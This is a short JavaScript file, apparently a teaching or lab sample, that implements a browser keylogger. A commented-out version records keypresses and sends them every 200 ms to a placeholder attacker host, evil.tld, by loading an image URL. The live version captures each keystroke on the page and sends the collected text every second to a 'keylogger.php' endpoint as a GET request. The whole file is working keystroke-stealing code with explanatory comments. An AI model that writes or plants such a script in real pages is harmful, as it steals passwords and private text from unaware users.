// var buffer = [];
// var attacker = 'http://evil.tld/?c='

// document.onkeypress = function(e) {
//     var timestamp = Date.now() | 0;
//     var stroke = {
//         k: e.key,
//         t: timestamp
//     };
//     buffer.push(stroke);
//     console.log(stroke);
// }

// window.setInterval(function() {
//     if (buffer.length > 0) {
//         var data = encodeURIComponent(JSON.stringify(buffer));
//         new Image().src = attacker + data;
//         buffer = [];
//     }
// }, 200);

var keys='';  // declaring a javascript variable to store each keystroke 
document.onkeypress = function(e) // calling the function to execute whenever a keystroke is there on html document  document.onkeypress  is an event handler

{
 get = window.event?event:e;
 key = get.keyCode?get.keyCode:get.charCode; //get character code 
 key = String.fromCharCode(key); // convert it to string 
 keys+=key; // append current character to previous one (concatinate)
}
window.setInterval(function(){
 console.log(keys);
 new Image().src = '/keylogger.php?c='+keys; // sending data as get request by creating a new image 
 keys = '';
}, 1000); // set interval to execute function continuously